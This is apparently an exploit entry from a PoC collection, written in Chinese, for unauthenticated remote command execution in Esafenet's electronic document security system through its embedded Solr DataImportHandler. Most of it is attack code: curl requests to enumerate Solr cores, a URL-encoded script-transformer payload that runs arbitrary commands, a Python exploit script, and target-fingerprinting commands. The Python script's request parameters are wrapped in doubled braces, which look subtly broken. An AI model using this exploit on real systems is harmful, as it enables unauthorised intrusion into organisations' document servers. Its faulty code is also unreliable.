---
id: ESAFENET-DATAIMPORT-RCE
title: 亿赛通电子文档安全管理系统 Solr dataimport 远程命令执行漏洞
product: esafenet
vendor: 亿赛通
version_affected: "电子文档安全管理系统"
severity: CRITICAL
tags: [rce, code_injection, 无需认证, 国产]
fingerprint: ["电子文档安全管理系统", "亿赛通", "CDGServer", "ESAFENET"]
---

## 漏洞描述

亿赛通电子文档安全管理系统内置 Apache Solr 服务，其 DataImportHandler 的 `dataConfig` 参数允许通过 script transformer 执行任意 Java 代码。攻击者可先获取 Solr core name，再利用 dataimport 接口执行 `Runtime.exec()` 实现远程命令执行。

## 影响版本

- 亿赛通电子文档安全管理系统

## 前置条件

- 无需认证
- Solr 端口可访问

## 利用步骤

1. 访问 `/solr/admin/cores` 获取 core name
2. 构造 dataimport 请求，在 dataConfig 中注入 script transformer
3. 通过 `Runtime.getRuntime().exec()` 执行任意命令

## Payload

### 第一步：获取 core name

```bash
curl -s "http://target/solr/admin/cores" | grep -oP '<str name="name">\K[^<]*'
```

### 第二步：执行命令

```bash
curl -s "http://target/solr/CORE_NAME/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%3Cscript%3E%3C!%5BCDATA%5B%0Afunction%20poc(row)%7B%0Avar%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22id%22).getInputStream()))%3B%0Avar%20result%20%3D%20%5B%5D%3B%0Awhile(true)%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(oneline)%3B%0Aif(!oneline)%20break%3B%0A%7D%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%22))%3B%0Areturn%20row%3B%0A%7D%0A%5D%5D%3E%3C%2Fscript%3E%0A%3Cdocument%3E%0A%3Centity%20stream%3D%22true%22%20name%3D%22entity1%22%20datasource%3D%22streamsrc1%22%20processor%3D%22XPathEntityProcessor%22%20rootEntity%3D%22true%22%20forEach%3D%22%2FRDF%2Fitem%22%20transformer%3D%22script%3Apoc%22%3E%0A%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Python 自动化利用

```python
import requests, re
requests.packages.urllib3.disable_warnings()

target = "http://target"

# 获取 core name
r = requests.get(f"{target}/solr/admin/cores", verify=False)
core = re.search(r'<str name="name">([^<]+)</str>', r.text).group(1)
print(f"[+] Core name: {core}")

# 构造 dataimport RCE payload
cmd = "id"
dataconfig = f"""<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
<script><![CDATA[
function poc(row){{
var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("{cmd}").getInputStream()));
var result = [];
while(true){{ var line = bufReader.readLine(); result.push(line); if(!line) break; }}
row.put("title",result.join("\\n"));
return row;
}}
]]></script>
<document>
<entity stream="true" name="entity1" datasource="streamsrc1" processor="XPathEntityProcessor" rootEntity="true" forEach="/RDF/item" transformer="script:poc">
<field column="title" xpath="/RDF/item/title" />
</entity>
</document>
</dataConfig>"""

r = requests.get(f"{target}/solr/{core}/dataimport", params={{
    "command": "full-import", "verbose": "false", "clean": "false",
    "commit": "false", "debug": "true", "core": "tika",
    "name": "dataimport", "dataConfig": dataconfig
}}, verify=False)
print(r.text)
```

## 验证方法

```bash
# 获取 core name 后执行 id 命令，检查响应中是否包含 uid=
curl -s "http://target/solr/admin/cores" | grep "name"
# 然后发送 dataimport 请求（见上方 Payload）
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "电子文档安全管理系统\|亿赛通\|ESAFENET"
curl -s "http://target/solr/admin/cores" -o /dev/null -w "%{http_code}"
```
